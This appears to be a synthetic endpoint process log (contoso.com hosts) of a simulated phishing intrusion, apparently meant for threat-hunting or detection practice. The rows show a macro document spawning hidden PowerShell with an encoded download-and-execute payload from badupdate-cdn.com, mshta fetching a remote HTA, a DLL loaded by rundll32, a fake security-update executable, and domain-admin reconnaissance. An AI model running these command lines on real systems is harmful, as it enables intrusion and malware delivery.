TimeGenerated,DeviceName,DeviceId,ActionType,FileName,FolderPath,ProcessCommandLine,SHA256,ProcessId,ProcessIntegrityLevel,AccountName,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessAccountName,InitiatingProcessAccountUpn,InitiatingProcessAccountSid,InitiatingProcessId,ReportId
2026-06-10T08:40:18Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16\,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\alexw\Downloads\Invoice_Remittance_Q2.docm""",a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2,4812,Medium,alexw,explorer.exe,C:\Windows\Explorer.EXE,userinit.exe,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,3920,200301
2026-06-10T08:40:52Z,HR-WS-03.contoso.com,c3c3c3c3-aaaa-bbbb-cccc-000000000003,ProcessCreated,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16\,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n",b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3,5104,Medium,meganb,explorer.exe,C:\Windows\Explorer.EXE,userinit.exe,meganb,meganb@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1153,4188,200302
2026-06-10T08:41:33Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAHUAcABkAGEAdABlAC0AYwBkAG4ALgBjAG8AbQAvAGEALwBzAC4AcABzADEAJwApAA==",c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4,6240,Medium,alexw,WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\alexw\Downloads\Invoice_Remittance_Q2.docm""",explorer.exe,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,4812,200303
2026-06-10T08:42:07Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,rundll32.exe,C:\Windows\System32\,"""C:\Windows\System32\rundll32.exe"" C:\Users\alexw\AppData\Roaming\WinUpdate\update.dll,Start",5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f,6712,Medium,alexw,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",WINWORD.EXE,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,6240,200304
2026-06-10T08:43:19Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,mshta.exe,C:\Windows\System32\,"""C:\Windows\System32\mshta.exe"" http://badupdate-cdn.com/a/p.hta",d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5,6904,Medium,alexw,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",WINWORD.EXE,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,6240,200305
2026-06-10T08:44:45Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,SecurityUpdate_KB5039211.exe,C:\Users\alexw\AppData\Local\Temp\,"""C:\Users\alexw\AppData\Local\Temp\SecurityUpdate_KB5039211.exe"" /S",9f2a6c1d4e8b7a30f5c2d9e1b8a4c7f60d3e2a1b9c8d7e6f5a4b3c2d1e0f9a8b,7048,Medium,alexw,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",WINWORD.EXE,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,6240,200306
2026-06-10T08:46:02Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,conhost.exe,C:\Windows\System32\,"""\??\C:\Windows\system32\conhost.exe"" 0xffffffff -ForceV1",e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6,7120,Medium,alexw,SecurityUpdate_KB5039211.exe,"""C:\Users\alexw\AppData\Local\Temp\SecurityUpdate_KB5039211.exe"" /S",powershell.exe,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,7048,200307
2026-06-10T08:47:36Z,HR-WS-03.contoso.com,c3c3c3c3-aaaa-bbbb-cccc-000000000003,ProcessCreated,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=renderer",f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7,5360,Low,meganb,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",explorer.exe,meganb,meganb@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1153,5012,200308
2026-06-10T08:49:11Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,cmd.exe,C:\Windows\System32\,"""C:\Windows\System32\cmd.exe"" /c whoami /all",a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8,7256,Medium,alexw,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",WINWORD.EXE,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,6240,200309
2026-06-10T08:50:44Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,net.exe,C:\Windows\System32\,"""C:\Windows\System32\net.exe"" group ""Domain Admins"" /domain",b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9,7340,Medium,alexw,cmd.exe,"""C:\Windows\System32\cmd.exe"" /c whoami /all",powershell.exe,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,7256,200310
